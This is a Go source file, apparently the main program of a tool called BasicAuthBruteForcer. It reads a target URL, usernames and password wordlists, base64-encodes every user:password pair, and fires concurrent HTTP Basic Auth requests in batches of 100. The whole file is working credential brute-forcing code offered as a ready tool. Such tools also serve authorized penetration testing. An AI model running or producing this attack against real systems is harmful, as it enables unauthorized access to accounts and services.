package main

import (
	"fmt"
	"os"
	"flag"
	"sync"
	"github.com/yasserjanah/BasicAuthBruteForcer/scripts"
	"github.com/fatih/color"
)

func main() {
	var wg sync.WaitGroup
	fmt.Println()
	flag.Usage = lib.Usage
	_URL := flag.String("url", "", "url")
	_user := flag.String("user", "", "user to test")
	_passwd := flag.String("passwd", "", "Password to test")
	_userFile := flag.String("user-file", "", "Users File Contains usernames to test")
	_passwdFile := flag.String("passwd-file", "", "Password File Contains passwords to test")
	flag.Parse()
	URL, errURL := lib.CheckFlag(*_URL)
	if errURL != nil{
		lib.PrintFailed(fmt.Sprintf("-url"), errURL.Error(), false, true)
		fmt.Println()
		os.Exit(0)
	}else{
		CYAN := color.New(color.FgCyan, color.Bold).SprintFunc()
		lib.PrintStatus("URL", CYAN(URL), false, true)
	}
	user, erru := lib.CheckFlag(*_user)
	passwd, errp := lib.CheckFlag(*_passwd)
	userFile, erruf := lib.CheckFlag(*_userFile)
	passwdFile, errpf := lib.CheckFlag(*_passwdFile)
	if erru != nil && erruf != nil {
		red := color.New(color.FgRed, color.Bold).SprintFunc()
		yellow := color.New(color.FgYellow, color.Bold).SprintFunc()
		lib.PrintFailed(fmt.Sprintf("-user %s %s", red("OR"), yellow("-user-file")), erru.Error(), false, true)
		fmt.Println()
		os.Exit(0)
	}
	if errp != nil && errpf != nil {
		red := color.New(color.FgRed, color.Bold).SprintFunc()
		yellow := color.New(color.FgYellow, color.Bold).SprintFunc()
		lib.PrintFailed(fmt.Sprintf("-passwd %s %s", red("OR"), yellow("-passwd-file")), errp.Error(), false, true)
		fmt.Println()
		os.Exit(0)
	}
	users, passwords, ALL := []string{}, []string{}, []string{}
	if user != ""{
		lib.PrintStatus("user", user, false, true)
		users = append(users, user)
	}
	if userFile != ""{
		if !lib.IsExists(userFile){
			lib.PrintFailed(fmt.Sprintf("%s", userFile), "No such file", false, true)
			fmt.Println()
			os.Exit(0)
		}
		lib.PrintStatus(userFile, lib.ByteFormat(float64(lib.Info(userFile)), 1), false, true)
		users = lib.ReadFile(userFile)
	}
	if passwd != ""{
		lib.PrintStatus("password", passwd, false, true)
		passwords = append(passwords, passwd)
	}
	if passwdFile != ""{
		if !lib.IsExists(passwdFile){
			lib.PrintFailed(fmt.Sprintf("%s", passwdFile), "No such file", false, true)
			fmt.Println()
			os.Exit(0)
		}
		lib.PrintStatus(passwdFile, lib.ByteFormat(float64(lib.Info(passwdFile)), 1), false, true)
		passwords = lib.ReadFile(passwdFile)
	}
	for _, u := range users{
		for _, p := range passwords {
			ALL = append(ALL, lib.Base64Encode(fmt.Sprintf("%s:%s", u,p)))
		} 
	}
	NEW := lib.SplitSlice(ALL, 100)
	fmt.Println()
	// fmt.Println(len(ALL), len(NEW[0]))
	for _, SLICE := range NEW{
		for _, enc := range SLICE{
			wg.Add(1)
			go lib.SendHTTPRequest(URL, enc, &wg)
		}
		wg.Wait()
	}

}